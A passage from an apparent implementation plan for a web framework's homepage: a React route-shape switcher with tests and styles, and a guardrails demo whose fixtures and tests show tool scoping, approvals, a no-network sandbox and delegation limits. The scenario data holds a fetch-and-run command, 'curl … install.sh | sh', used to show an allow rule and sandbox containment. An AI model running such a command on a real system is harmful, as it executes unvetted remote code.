  await act(async () => root?.unmount())
  root = undefined
  media?.restore()
  media = undefined
})

const code = await prepareRouteShapes()

async function mount(reduce: boolean) {
  media = stubMatchMedia({ [REDUCE]: reduce, [FULL]: !reduce })
  const container = document.createElement("div")
  document.body.replaceChildren(container)
  root = createRoot(container)
  await act(async () => root?.render(<ShapeSwitcher code={code} />))
  const radio = (id: string) => {
    const match = container.querySelector<HTMLInputElement>(`input[type="radio"][value="${id}"]`)
    if (!match) throw new Error(`No radio for ${id}`)
    return match
  }
  const visible = () =>
    [...container.querySelectorAll('[data-active="true"]')].map((node) =>
      node.getAttribute("data-shape"),
    )
  return {
    container,
    pick: (id: string) => act(async () => radio(id).click()),
    checked: () => container.querySelector<HTMLInputElement>("input:checked")?.value,
    visible,
    code: () => container.querySelector('pre[data-active="true"]')?.textContent ?? "",
    hiddenAreInert: () =>
      [...container.querySelectorAll('[data-shape]:not([data-active="true"])')].every(
        (node) => node.getAttribute("aria-hidden") === "true" && node.hasAttribute("inert"),
      ),
    live: () => container.querySelector('[aria-live="polite"]')?.textContent,
    fading: () =>
      [...container.querySelectorAll("[data-shape]")].flatMap((node) =>
        gsap.getTweensOf(node).filter((tween) => tween.duration() > 0 && tween.isActive()),
      ),
  }
}

it("renders every shape on the server, with the agent showing and nothing announced", async () => {
  const html = renderToString(<RouteShapes code={code} />)
  const container = document.createElement("div")
  container.innerHTML = html
  expect(container.querySelector("section#route-shapes")?.getAttribute("aria-labelledby")).toBe(
    "route-shapes-title",
  )
  expect(container.querySelector("fieldset legend")?.textContent).toBe("Route shape")
  expect(
    [...container.querySelectorAll<HTMLInputElement>('input[type="radio"]')].map((input) => [
      input.value,
      input.checked,
    ]),
  ).toEqual([
    ["agent", true],
    ["workflow", false],
    ["graph", false],
    ["chain", false],
  ])
  const pres = [...container.querySelectorAll("pre[data-shape]")]
  expect(pres.map((pre) => pre.getAttribute("data-shape"))).toEqual([
    "agent",
    "workflow",
    "graph",
    "chain",
  ])
  expect(pres[0]?.textContent).toContain("export default agent({")
  expect(pres[2]?.textContent).toContain("export const graph = new StateGraph(Hello)")
  // No element starts hidden by an inline style: the no-JS page is complete.
  expect(container.querySelector("[style]")).toBeNull()
  expect(container.querySelector('[aria-live="polite"]')?.textContent).toBe("")
})

it("switches the shape at once, announces it, and keeps the others inert", async () => {
  const view = await mount(true)
  expect(view.checked()).toBe("agent")
  expect(view.live()).toBe("")
  await view.pick("graph")
  expect(view.checked()).toBe("graph")
  expect(view.visible()).toEqual(["graph", "graph"])
  expect(view.code()).toContain("new StateGraph(Hello)")
  expect(view.hiddenAreInert()).toBe(true)
  expect(view.live()).toBe(
    "Showing src/app/hello/index.ts as a graph. Raw LangGraph, with your own state, nodes and edges.",
  )
  // Reduced motion: the final state, and nothing moving.
  expect(view.fading()).toEqual([])
})

it("fades the new shape in with motion on, and a quick second pick replaces the fade", async () => {
  const view = await mount(false)
  await view.pick("workflow")
  expect(view.fading().length).toBeGreaterThan(0)
  await view.pick("chain")
  // The semantic state is final at once, whatever the fade is doing.
  expect(view.checked()).toBe("chain")
  expect(view.visible()).toEqual(["chain", "chain"])
  expect(view.live()).toBe(
    "Showing src/app/hello/index.ts as a chain. One LangChain chain that runs its steps in order.",
  )
  const workflow = [...view.container.querySelectorAll('[data-shape="workflow"]')]
  expect(workflow.flatMap((node) => gsap.getTweensOf(node))).toEqual([])
  expect(workflow.every((node) => (node as HTMLElement).style.opacity === "")).toBe(true)
})
```

- [ ] **Step 2: Run it to verify it fails**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/shapes/ShapeSwitcher.test.tsx`
Expected: FAIL; `./prepare`, `./RouteShapes` and `./ShapeSwitcher` can't be resolved.

- [ ] **Step 3: Write the server-only preparation**

`shapes/prepare.ts`:

```ts
import "server-only"
import { highlightCode } from "../highlight"
import { routeShapes, SHAPE_PATH, type ShapeId } from "./route-shapes"
import { shapeSources } from "./shape-sources"

/** Each shape's index.ts, highlighted on the server: one HTML string per line. */
export async function prepareRouteShapes(): Promise<Readonly<Record<ShapeId, readonly string[]>>> {
  const entries = await Promise.all(
    routeShapes.map(async (shape) => {
      const code = await highlightCode(shapeSources[shape.id], "typescript", SHAPE_PATH, "")
      return [shape.id, code.lines] as const
    }),
  )
  return Object.fromEntries(entries) as Record<ShapeId, readonly string[]>
}
```

- [ ] **Step 4: Write the island**

`shapes/ShapeSwitcher.tsx`:

```tsx
"use client"
import { useEffect, useId, useLayoutEffect, useRef, useState } from "react"
import { gsap, withMotion } from "../motion/gsap"
import { routeShapes, SHAPE_PATH, type ShapeId } from "./route-shapes"
import styles from "./shapes.module.css"

type Fade = ReturnType<typeof gsap.fromTo>

/** Stops a running fade and drops the inline opacity it left behind. */
function stopFade(fade: { current: Fade | null }) {
  const running = fade.current
  fade.current = null
  if (!running) return
  const targets = running.targets()
  running.kill()
  gsap.set(targets, { clearProps: "opacity" })
}

/** What the live region says after the visitor picks a shape. */
export function describeShape(id: ShapeId): string {
  const shape = routeShapes.find((candidate) => candidate.id === id)
  return `Showing ${SHAPE_PATH} as ${id === "agent" ? "an" : "a"} ${id}. ${shape?.strip ?? ""}`
}

/**
 * The route-shape switcher: one radio per shape, and the same hello route
 * written in that shape. Every variant stays mounted in one grid cell, so the
 * tallest reserves the space and switching never moves the page.
 */
export function ShapeSwitcher({
  code,
}: {
  readonly code: Readonly<Record<ShapeId, readonly string[]>>
}) {
  const name = useId()
  const rootRef = useRef<HTMLDivElement>(null)
  const motionRef = useRef(false)
  const fadeRef = useRef<Fade | null>(null)
  const [active, setActive] = useState<ShapeId>("agent")
  const [changes, setChanges] = useState(0)
  const [announcement, setAnnouncement] = useState("")

  useEffect(() => {
    const root = rootRef.current
    if (!root) return
    const stop = withMotion(root, {
      reduce: () => {
        motionRef.current = false
        stopFade(fadeRef)
        return undefined
      },
      full: () => {
        motionRef.current = true
        return () => {
          motionRef.current = false
        }
      },
    })
    return () => {
      stop()
      stopFade(fadeRef)
    }
  }, [])

  // The state is already final when this runs; the fade only moves pixels, and
  // the next pick kills it.
  useLayoutEffect(() => {
    if (changes === 0) return
    stopFade(fadeRef)
    if (!motionRef.current) return
    const targets = rootRef.current?.querySelectorAll(`[data-shape="${active}"]`)
    if (!targets?.length) return
    fadeRef.current = gsap.fromTo(
      targets,
      { opacity: 0 },
      { opacity: 1, duration: 0.2, ease: "power1.out", clearProps: "opacity" },
    )
  }, [changes, active])

  function choose(id: ShapeId) {
    setActive(id)
    setChanges((count) => count + 1)
    setAnnouncement(describeShape(id))
  }

  return (
    <div ref={rootRef} className={styles.switcher}>
      <fieldset className={styles.options}>
        <legend className={styles.legend}>Route shape</legend>
        {routeShapes.map((shape) => (
          <label key={shape.id} className={styles.option}>
            <input
              type="radio"
              name={name}
              value={shape.id}
              checked={shape.id === active}
              onChange={() => choose(shape.id)}
            />
            <span>{shape.id}</span>
          </label>
        ))}
      </fieldset>
      <div className={styles.panel}>
        <p className={styles.path}>{SHAPE_PATH}</p>
        <div className={styles.stage}>
          {routeShapes.map((shape) => {
            const on = shape.id === active
            return (
              <pre
                key={shape.id}
                className={styles.code}
                data-shape={shape.id}
                data-active={on}
                aria-hidden={on ? undefined : true}
                inert={on ? undefined : true}
              >
                <code>
                  {code[shape.id].map((html, index) => {
                    const lineKey = `${shape.id}:${index}`
                    return (
                      <span
                        key={lineKey}
                        className={styles.line}
                        // biome-ignore lint/security/noDangerouslySetInnerHtml: Only server-produced Shiki tokens; highlightCode escapes all source text.
                        dangerouslySetInnerHTML={{ __html: html }}
                      />
                    )
                  })}
                </code>
              </pre>
            )
          })}
        </div>
        <div className={styles.stage}>
          {routeShapes.map((shape) => {
            const on = shape.id === active
            return (
              <p
                key={shape.id}
                className={styles.strip}
                data-shape={shape.id}
                data-active={on}
                aria-hidden={on ? undefined : true}
                inert={on ? undefined : true}
              >
                <code>{shape.export}</code>
                <span>{shape.strip}</span>
                <a href={shape.docsHref}>{shape.docsLabel} →</a>
              </p>
            )
          })}
        </div>
      </div>
      <p className="sr-only" aria-live="polite">
        {announcement}
      </p>
    </div>
  )
}
```

- [ ] **Step 5: Write the shell and the styles**

`shapes/RouteShapes.tsx`:

```tsx
import { Eyebrow } from "../../ui/Eyebrow"
import { type ShapeId, shapeLinks } from "./route-shapes"
import { ShapeSwitcher } from "./ShapeSwitcher"
import styles from "./shapes.module.css"

/**
 * "You keep the graph": the hello route written in each of the four shapes a
 * route can export. The switcher is the island; the server renders it with the
 * agent shape showing and every other shape in the DOM.
 */
export function RouteShapes({
  code,
}: {
  readonly code: Readonly<Record<ShapeId, readonly string[]>>
}) {
  return (
    <section id="route-shapes" className={styles.section} aria-labelledby="route-shapes-title">
      <div className={styles.intro}>
        <Eyebrow className={styles.eyebrow}>You keep the graph</Eyebrow>
        <h2 id="route-shapes-title">Pick the shape per route.</h2>
        <p>
          A route's index.ts exports one of four shapes. Let the model drive with an agent, or write
          the steps yourself as a workflow, a LangGraph graph or a chain.
        </p>
      </div>
      <ShapeSwitcher code={code} />
      <p className={styles.links}>
        {shapeLinks.map((link) => (
          <a key={link.href} href={link.href}>
            {link.label} →
          </a>
        ))}
      </p>
    </section>
  )
}
```

`shapes/shapes.module.css`. These are dark-panel tokens, as in `playground.module.css`. The code is plain Shiki colours on `--color-panel`, with no tint, so every foreground keeps its documented 4.5:1 or better. `min-height: 1lh` keeps blank code lines at full height.

```css
/* "You keep the graph" (#route-shapes). Paper Relay tokens only (tokens.css). */
.section {
  padding: 56px 0;
  border-bottom: 1px solid var(--color-rule);
}
.intro {
  max-width: 640px;
  margin-bottom: 32px;
}
.eyebrow {
  margin: 0;
}
.intro h2 {
  font-size: clamp(30px, 3.5vw, 43px);
  font-weight: 500;
  line-height: 1.08;
  letter-spacing: -0.045em;
  margin: 24px 0 16px;
}
.intro p:not([data-ui="eyebrow"]) {
  font-size: 15px;
  line-height: 1.8;
  color: var(--color-ink-muted);
  margin: 0;
}

/* The segmented control: native radios, one 44px cell each. */
.options {
  display: flex;
  flex-wrap: wrap;
  gap: 0;
  min-inline-size: 0;
  margin: 0 0 16px;
  padding: 0;
  border: 0;
}
.legend {
  margin-bottom: 8px;
  padding: 0;
  font:
    12px / 1.6 var(--font-mono),
    monospace;
  color: var(--color-ink-muted);
}
.option {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  min-height: 44px;
  padding: 0 16px;
  border: 1px solid var(--color-rule-strong);
  font:
    13px / 1.4 var(--font-mono),
    monospace;
  color: var(--color-ink);
  cursor: pointer;
}
.option + .option {
  margin-left: -1px;
}
.option input {
  margin: 0;
  accent-color: var(--color-ink);
}
/* The chosen shape: tint and an ink border as well as the filled radio. */
.option:has(input:checked) {
  position: relative;
  z-index: 1;
  border-color: var(--color-ink);
  background: var(--color-relay-tint);
}

.panel {
  container-type: inline-size;
  background: var(--color-panel);
  color: var(--color-panel-ink);
  /* The global focus ring is tuned for paper; on the panel it uses the accent. */
  --color-focus: var(--color-panel-accent);
}
.path {
  margin: 0;
  padding: 12px 16px;
  border-bottom: 1px solid var(--color-panel-rule);
  background: var(--color-panel-strip);
  font:
    12px / 1.6 var(--font-mono),
    monospace;
  color: var(--color-panel-muted);
}
/* Every variant sits in the same grid cell: the tallest sets the height, so
   switching never shifts the page. Only the active one is visible. */
.stage {
  display: grid;
}
.stage > * {
  grid-area: 1 / 1;
}
.stage > :not([data-active="true"]) {
  visibility: hidden;
}
.code {
  margin: 0;
  padding: 16px;
  font:
    13px / 1.7 var(--font-mono),
    monospace;
  white-space: pre-wrap;
  overflow-wrap: anywhere;
  tab-size: 2;
}
.code code {
  font: inherit;
}
.line {
  display: block;
  min-height: 1lh;
}
.strip {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 4px 12px;
  margin: 0;
  padding: 12px 16px;
  border-top: 1px solid var(--color-panel-rule);
  font-size: 14px;
  line-height: 1.6;
  color: var(--color-panel-muted);
}
.strip code {
  font:
    12px / 1.6 var(--font-mono),
    monospace;
  color: var(--color-panel-ink);
}
.strip a {
  display: inline-flex;
  align-items: center;
  min-height: 44px;
  text-underline-offset: 5px;
}
.links {
  display: flex;
  flex-wrap: wrap;
  gap: 0 24px;
  margin: 16px 0 0;
}
.links a {
  display: inline-flex;
  align-items: center;
  min-height: 44px;
  font-size: 14px;
  text-underline-offset: 5px;
}
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/shapes`
Expected: PASS (2 files, 10 tests).

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/styles/design-system.test.ts`
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git status --short
git add apps/web/app/components/homepage/shapes/prepare.ts apps/web/app/components/homepage/shapes/ShapeSwitcher.tsx apps/web/app/components/homepage/shapes/shapes.module.css apps/web/app/components/homepage/shapes/RouteShapes.tsx apps/web/app/components/homepage/shapes/ShapeSwitcher.test.tsx
git commit -m "feat(web): the route-shape switcher, native radios over stacked variants

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---

### Task 4: The guardrails fixtures, scenarios and framework-bound checks

**Files:**
- Create: `gates/fixtures/package.json`, `gates/fixtures/b4.config.ts`
- Create: `gates/fixtures/src/app/support/index.ts`, `gates/fixtures/src/app/support/tools/refund.ts`, `gates/fixtures/src/app/support/subagents/translator/index.ts`, `gates/fixtures/src/tools/deleteUser.ts`
- Create: `gates/gate-scenarios.ts`, `gates/gate-sources.json`, `gates/gate-sources.ts`
- Test: `gates/gate-scenarios.test.ts`

**How each claim is checked.** Every board state the page shows is asserted beside the framework call that produces it:

| Check | Framework code the test runs | Proves |
|---|---|---|
| Tool scope | `extractToolSchemasForRoute` (authored `refund`, shared `deleteUser`), `createWorkspaceMarker().load` with `workspaceRoot: "/workspace"` (what the CLI passes when a sandbox is configured, `execute-route-core.ts`), then `resolveToolScope(…, support.tools, …)` | `readFile`, `runBash` and `refund` are kept; `deleteUser` is withheld. `resolveToolScope` also throws on unknown names, which proves the fixture's `approve` and `deny` names exist. |
| Permission | `createPermissionsStore` (the Node store `b4 dev` uses) from the fixture's `permissions`, `store.match`, and `gateToolOp(…, { interruptCapable: false })` | `curl … \| sh` is `allow` by prefix. `refund` is `unknown`, so it requires approval; outside a run that can pause, the same gate refuses with "requires approval". |
| Sandbox | `dockerSandbox({ docker })` with a recording client (the package's own unit-test pattern), `acquire` with the fixture's `network` | `--network none`. |
| Delegation | `discoverRoutes`, `resolveSubagentRegistry`, `resolveGuardedSubagent` | 9,000 characters returns exactly `[B4_E3002] Send the translator one reply at a time.` (the string on the board), and a short input dispatches. |

- [ ] **Step 1: Write the failing test**

Create `apps/web/app/components/homepage/gates/gate-scenarios.test.ts`:

```ts
import { readFileSync } from "node:fs"
import { join, resolve } from "node:path"
import { fileURLToPath } from "node:url"
import {
  createWorkspaceMarker,
  gateToolOp,
  resolveGuardedSubagent,
  resolveSubagentRegistry,
  resolveToolScope,
} from "@b4run/core"
import { discoverRoutes, extractToolSchemasForRoute, nodeMarkerFs } from "@b4run/core/node"
import { createPermissionsStore } from "@b4run/permissions/node"
import { dockerSandbox } from "@b4run/sandbox"
import { describe, expect, it } from "vitest"
import { contrast } from "../../../../lib/design-system-checks"
import { COLOR, SHIKI_FOREGROUNDS } from "../../../../lib/design-tokens"
import { DOCS_INDEX } from "../../docs/search-index"
import appConfig from "./fixtures/b4.config"
import support from "./fixtures/src/app/support/index"
import translator from "./fixtures/src/app/support/subagents/translator/index"
import {
  BASH_COMMAND,
  type BoardId,
  CONFIG_FILES,
  FIXTURES_APP,
  GATES,
  GUARDRAILS_LINK,
  gateBoards,
  gateScenarios,
  linesContaining,
  TASK_INPUT_LENGTH,
} from "./gate-scenarios"
import { gateSources } from "./gate-sources"

const repoRoot = fileURLToPath(new URL("../../../../../../", import.meta.url))
const appRoot = resolve(repoRoot, FIXTURES_APP)
const supportDir = join(appRoot, "src/app/support")
const board = (id: BoardId) => {
  const found = gateBoards.find((candidate) => candidate.id === id)
  if (!found) throw new Error(`No board ${id}`)
  return found
}
const stateOf = (id: BoardId, gate: string) =>
  board(id).steps.find((step) => step.gate === gate)?.state

describe("the tracer shows real config", () => {
  it("shows each fixture exactly as it is on disk", () => {
    for (const [id, file] of Object.entries(CONFIG_FILES)) {
      expect(gateSources[id as keyof typeof CONFIG_FILES], file.origin).toBe(
        readFileSync(resolve(repoRoot, file.origin), "utf8"),
      )
    }
  })

  it("marks, for every scenario, lines that really are in its file", () => {
    for (const scenario of gateScenarios) {
      const text = gateSources[scenario.file]
      for (const part of scenario.why) expect(text, `${scenario.id}: ${part}`).toContain(part)
      expect(linesContaining(text, scenario.why).length, scenario.id).toBeGreaterThan(0)
    }
  })

  it("has a board for every scenario and each answer, with the four checks in order", () => {
    expect(gateBoards.map((candidate) => candidate.id).sort()).toEqual(
      ["bash", "delegate", "delete", "read", "refund", "refund-deny", "refund-once"].sort(),
    )
    for (const candidate of gateBoards) {
      expect(
        candidate.steps.map((step) => step.gate),
        candidate.id,
      ).toEqual(GATES.map((gate) => gate.id))
      expect(
        `${candidate.result} ${candidate.steps.map((step) => step.note).join(" ")}`,
      ).not.toContain("—")
    }
  })

  it("links every scenario and the section to docs headings that exist", () => {
    for (const href of [
      ...gateScenarios.map((scenario) => scenario.docsHref),
      GUARDRAILS_LINK.href,
    ]) {
      const [path, anchor] = href.split("#")
      const page = DOCS_INDEX.find((entry) => entry.href === path)
      expect(page, href).toBeDefined()
      expect(
        page?.headings.map((heading) => heading.anchor),
        href,
      ).toContain(anchor)
    }
  })
})

describe("each check answers as the framework does", () => {
  it("tool scope: the route keeps readFile, runBash and refund, and deleteUser never reaches the model", async () => {
    const authored = await extractToolSchemasForRoute({
      routeDir: supportDir,
      sharedToolsDir: join(appRoot, "src"),
      tsconfig: resolve(repoRoot, "packages/config-typescript/node.json"),
    })
    expect(authored.map((tool) => tool.name).sort()).toEqual(["deleteUser", "refund"])
    // With a sandbox, the runtime hands markers the sandbox's workspace root.
    const manifest = await discoverRoutes({ appRoot })
    const context = {
      appRoot,
      markerFs: nodeMarkerFs,
      workspaceRoot: "/workspace",
      routeManifest: manifest,
      descriptor: support,
    }
    const marker = createWorkspaceMarker()
    expect(await marker.detect(supportDir, context)).toBe(true)
    const workspace = await marker.load(supportDir, context)
    const kept = resolveToolScope(
      [
        ...authored.map((tool) => ({ name: tool.name, origin: "authored" as const })),
        ...(workspace.tools ?? []).map((tool) => ({
          name: tool.name,
          origin: "capability" as const,
        })),
      ],
      support.tools,
      { isSubagent: false, routeId: "/support" },
    )
    expect([...kept].sort()).toEqual(
      ["editFile", "listDir", "readFile", "refund", "runBash", "writeFile"].sort(),
    )
    expect(stateOf("read", "scope")).toBe("passed")
    expect(stateOf("refund", "scope")).toBe("passed")
    expect(stateOf("bash", "scope")).toBe("passed")
    expect(stateOf("delete", "scope")).toBe("stopped")
  }, 60_000)

  it("permission: curl is allow-listed by prefix, and refund waits for a person", async () => {
    const permissions = appConfig.permissions
    const store = createPermissionsStore({
      appRoot,
      config: { version: 1, allow: permissions?.allow ?? {}, deny: permissions?.deny ?? {} },
      mode: "interactive",
    })
    expect(store.match("bash", BASH_COMMAND)).toBe("allow")
    expect(support.tools?.approve).toEqual(["refund"])
    expect(store.match("tool", "refund")).toBe("unknown")
    // Outside a run that can pause, the same gate refuses: in a run, it asks.
    const gate = await gateToolOp(store, "refund", '{"amount":500}', { interruptCapable: false })
    expect(gate.allowed).toBe(false)
    expect(gate.allowed === false && gate.reason).toContain("requires approval")
    expect(stateOf("bash", "permission")).toBe("passed")
    expect(stateOf("refund", "permission")).toBe("waiting")
    expect(stateOf("refund-once", "permission")).toBe("passed")
    expect(stateOf("refund-deny", "permission")).toBe("stopped")
  })

  it("sandbox: this config closes egress, and Docker runs the sandbox with no network", async () => {
    expect(appConfig.sandbox?.network).toEqual({ mode: "deny" })
    const runs: string[][] = []
    const provider = dockerSandbox({
      scope: "my-agent",
      image: "node:24-slim",
      docker: {
        run: async (args) => {
          runs.push([...args])
          return { stdout: args[0] === "ps" ? "" : "ok", stderr: "", exitCode: 0 }
        },
        exec: async () => ({ stdout: "", stderr: "", exitCode: 0 }),
      },
    })
    const network = appConfig.sandbox?.network
    if (!network) throw new Error("The fixture sets a network policy")
    await provider.acquire({
      threadId: "thread-1",
      policy: { network },
      signal: new AbortController().signal,
    })
    expect(runs.find((args) => args[0] === "run")?.join(" ")).toContain("--network none")
    expect(stateOf("bash", "sandbox")).toBe("contained")
  })

  it("delegation: a long input is refused before translator starts, and a short one goes through", async () => {
    const manifest = await discoverRoutes({ appRoot })
    expect(manifest.routes.map((route) => [route.id, route.kind])).toEqual([
      ["/support", "agent"],
      ["/support/subagents/translator", "agent"],
    ])
    const registry = await resolveSubagentRegistry({
      descriptor: support,
      descriptorRouteIndex: new Map([[translator, ["/support/subagents/translator"]]]),
      parentRouteDir: supportDir,
      parentRouteId: "/support",
      routeManifest: manifest,
      loadDescription: async () => translator.description ?? "",
    })
    const dispatch = (input: string) =>
      resolveGuardedSubagent({
        callId: "call-1",
        input,
        name: "translator",
        registry,
        runtime: { parentRouteId: "/support", signal: new AbortController().signal },
        interruptCapable: false,
        resolve: async () => "started",
      })
    const refused = await dispatch("x".repeat(TASK_INPUT_LENGTH))
    expect(refused.ok).toBe(false)
    const message = refused.ok ? "" : refused.message
    expect(message).toBe("[B4_E3002] Send the translator one reply at a time.")
    expect(board("delegate").result).toContain(`"${message}"`)
    expect(board("delegate").steps.at(-1)?.note).toContain(
      TASK_INPUT_LENGTH.toLocaleString("en-US"),
    )
    expect((await dispatch("Merci pour votre patience.")).ok).toBe(true)
    expect(stateOf("delegate", "delegation")).toBe("stopped")
  }, 60_000)
})

describe("the tracer's colours stay readable", () => {
  /** `color-mix(in srgb, a p%, b)`, as the browser computes it. */
  const mix = (a: string, b: string, share: number) => {
    const channels = (hex: string) =>
      [1, 3, 5].map((start) => Number.parseInt(hex.slice(start, start + 2), 16))
    const [ca, cb] = [channels(a), channels(b)]
    return `#${ca
      .map((value, index) =>
        Math.round(value * share + (cb[index] ?? 0) * (1 - share))
          .toString(16)
          .padStart(2, "0"),
      )
      .join("")}`
  }

  it("keeps every code colour at 4.5:1 or more on a marked line", () => {
    const marked = mix(COLOR["relay-tint"], COLOR.panel, 0.14)
    for (const foreground of SHIKI_FOREGROUNDS) {
      expect(contrast(foreground, marked), foreground).toBeGreaterThanOrEqual(4.5)
    }
  })

  it("keeps each state's text at 4.5:1 or more on its tint", () => {
    expect(contrast(COLOR.ok, COLOR["ok-tint"])).toBeGreaterThanOrEqual(4.5)
    expect(contrast(COLOR.warn, COLOR["warn-tint"])).toBeGreaterThanOrEqual(4.5)
    expect(contrast(COLOR.danger, COLOR["danger-tint"])).toBeGreaterThanOrEqual(4.5)
    expect(contrast(COLOR["ink-muted"], COLOR.page)).toBeGreaterThanOrEqual(4.5)
  })
})
```

- [ ] **Step 2: Run it to verify it fails**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/gates/gate-scenarios.test.ts`
Expected: FAIL; `./fixtures/b4.config` and `./gate-scenarios` can't be resolved.

- [ ] **Step 3: Write the fixture app**

```bash
mkdir -p apps/web/app/components/homepage/gates/fixtures/src/tools apps/web/app/components/homepage/gates/fixtures/src/app/support/tools apps/web/app/components/homepage/gates/fixtures/src/app/support/subagents/translator
```

`gates/fixtures/package.json`:

```json
{
  "name": "homepage-guardrails",
  "private": true,
  "type": "module"
}
```

`gates/fixtures/b4.config.ts`:

```ts
import { config } from "@b4run/cli"
import { dockerSandbox } from "@b4run/sandbox"

export default config({
  permissions: {
    allow: { bash: ["curl"] },
  },
  sandbox: {
    provider: dockerSandbox({ scope: "my-agent", image: "node:24-slim" }),
    network: { mode: "deny" },
  },
})
```

`gates/fixtures/src/app/support/index.ts`. Keep `tools` expanded across four lines: Biome preserves an object literal that opens with a line break, and each list needs its own line so it can be marked on its own.

```ts
import { agent, type DelegationConstraintPredicate } from "@b4run/sdk"
import translator from "./subagents/translator/index.js"

// The translator gets one reply at a time, never a whole thread.
const oneReply: DelegationConstraintPredicate = ({ input }) =>
  input.length <= 2_000 || "Send the translator one reply at a time."

export default agent({
  model: "gpt-5-mini",
  systemPrompt: "You answer support questions. Refund an order only when the policy allows it.",
  tools: {
    approve: ["refund"],
    deny: ["deleteUser"],
  },
  subagents: { translator },
  delegation: {
    rules: { translator: { action: "constrain", predicate: oneReply } },
  },
})
```

`gates/fixtures/src/app/support/tools/refund.ts`:

```ts
/** Refund the customer's last order, in cents. */
export default async (input: { readonly amount: number }) => {
  return { refunded: input.amount }
}
```

`gates/fixtures/src/app/support/subagents/translator/index.ts`:

```ts
import { agent } from "@b4run/sdk"

export default agent({
  model: "gpt-5-mini",
  description: "Translate one support reply into the customer's language.",
  systemPrompt: "You translate support replies. Reply with the translation only.",
})
```

`gates/fixtures/src/tools/deleteUser.ts`:

```ts
/** Delete a user account. Shared by every route in src/app/. */
export default async (input: { readonly userId: string }) => {
  return { deleted: input.userId }
}
```

- [ ] **Step 4: Write the scenarios**

`gates/gate-scenarios.ts`:

```ts
import type { PermissionDecision } from "@b4run/permissions"

/**
 * The call tracer's data: five calls a support agent might make, and what each
 * of B4's four checks does with them under one app's config (gates/fixtures/).
 * gate-scenarios.test.ts runs every claim here through the framework's own
 * scope, permission, sandbox and delegation code.
 */
export type GateId = "scope" | "permission" | "sandbox" | "delegation"
export type GateState = "passed" | "waiting" | "stopped" | "contained" | "skipped" | "unreached"
export type ScenarioId = "read" | "refund" | "bash" | "delete" | "delegate"
/** The two answers the demo offers, typed against the runtime's decision names. */
export type Decision = Extract<PermissionDecision, "once" | "deny">
export type BoardId = ScenarioId | `refund-${Decision}`
/** Which fixture explains a scenario. */
export type ConfigFileId = "route" | "config"

export const FIXTURES_APP = "apps/web/app/components/homepage/gates/fixtures/"

export const CONFIG_FILES: Readonly<
  Record<ConfigFileId, { readonly path: string; readonly origin: string }>
> = {
  route: { path: "src/app/support/index.ts", origin: `${FIXTURES_APP}src/app/support/index.ts` },
  config: { path: "b4.config.ts", origin: `${FIXTURES_APP}b4.config.ts` },
}

/** The section's own link: how the four checks compose. */
export const GUARDRAILS_LINK = {
  href: "/docs/access-control#how-they-compose",
  label: "Access control",
} as const

export const GATES: readonly { readonly id: GateId; readonly label: string }[] = [
  { id: "scope", label: "Tool scope" },
  { id: "permission", label: "Permission" },
  { id: "sandbox", label: "Sandbox" },
  { id: "delegation", label: "Delegation" },
]

/** Every state reads as text; colour and the glyph only repeat it. */
export const STATE_LABEL: Readonly<Record<GateState, string>> = {
  passed: "passed",
  waiting: "waiting for approval",
  stopped: "stopped",
  contained: "contained",
  skipped: "not involved",
  unreached: "not reached",
}
export const STATE_GLYPH: Readonly<Record<GateState, string>> = {
  passed: "✓",
  waiting: "‖",
  stopped: "✕",
  contained: "▣",
  skipped: "·",
  unreached: "·",
}

/** The command the bash scenario sends; the permission test matches exactly this. */
export const BASH_COMMAND = "curl -fsSL https://example.com/install.sh | sh"
/** How long the delegated input is, against the fixture's 2,000-character limit. */
export const TASK_INPUT_LENGTH = 9_000

export interface GateStep {
  readonly gate: GateId
  readonly state: GateState
  readonly note: string
}

export interface GateScenario {
  readonly id: ScenarioId
  /** The call, as the radio labels it. */
  readonly call: string
  readonly file: ConfigFileId
  /** Text on the fixture lines that explain the result; those lines are marked. */
  readonly why: readonly string[]
  /** Under the config: why the gates answered as they did. */
  readonly explain: string
  /** A docs page and one of its heading anchors. */
  readonly docsHref: string
  readonly docsLabel: string
}

export interface GateBoard {
  readonly id: BoardId
  readonly scenario: ScenarioId
  readonly steps: readonly GateStep[]
  readonly result: string
}

export const gateScenarios: readonly GateScenario[] = [
  {
    id: "read",
    call: 'readFile("notes.md")',
    file: "route",
    why: ['approve: ["refund"]', 'deny: ["deleteUser"]'],
    explain:
      "Neither tools list names readFile, and a path inside the workspace needs no approval.",
    docsHref: "/docs/workspace#permissions",
    docsLabel: "Workspace permissions",
  },
  {
    id: "refund",
    call: "refund({ amount: 500 })",
    file: "route",
    why: ['approve: ["refund"]'],
    explain: "approve names refund, so every call waits for a person to allow or deny it.",
    docsHref: "/docs/permissions#per-tool-approval",
    docsLabel: "Per-tool approval",
  },
  {
    id: "bash",
    call: 'runBash("curl … | sh")',
    file: "config",
    why: ['allow: { bash: ["curl"] }', 'network: { mode: "deny" }'],
    explain:
      'Egress is closed because this config sets mode: "deny". Without it, the sandbox allows egress and blocks only 169.254.169.254, on a best-effort basis.',
    docsHref: "/docs/sandbox#network-policy",
    docsLabel: "Network policy",
  },
  {
    id: "delete",
    call: 'deleteUser({ userId: "u_42" })',
    file: "route",
    why: ['deny: ["deleteUser"]'],
    explain:
      "deleteUser lives in src/tools/, which every route shares. This route denies it, so it never reaches the model.",
    docsHref: "/docs/tools#scoping-a-routes-tools",
    docsLabel: "Scoping a route's tools",
  },
  {
    id: "delegate",
    call: 'task({ subagent: "translator", … })',
    file: "route",
    why: ["input.length <= 2_000", 'action: "constrain"'],
    explain:
      "The delegation rule checks the input before translator starts. Anything longer than 2,000 characters is refused.",
    docsHref: "/docs/subagents#delegation-policy",
    docsLabel: "Delegation policy",
  },
]

const onlyTask = "Only a task call to a subagent reaches this check."

export const gateBoards: readonly GateBoard[] = [
  {
    id: "read",
    scenario: "read",
    steps: [
      {
        gate: "scope",
        state: "passed",
        note: "readFile comes with the workspace, and deny doesn't name it.",
      },
      {
        gate: "permission",
        state: "passed",
        note: "A path inside the workspace needs no approval.",
      },
      {
        gate: "sandbox",
        state: "contained",
        note: "It reads the sandbox's workspace, not your disk.",
      },
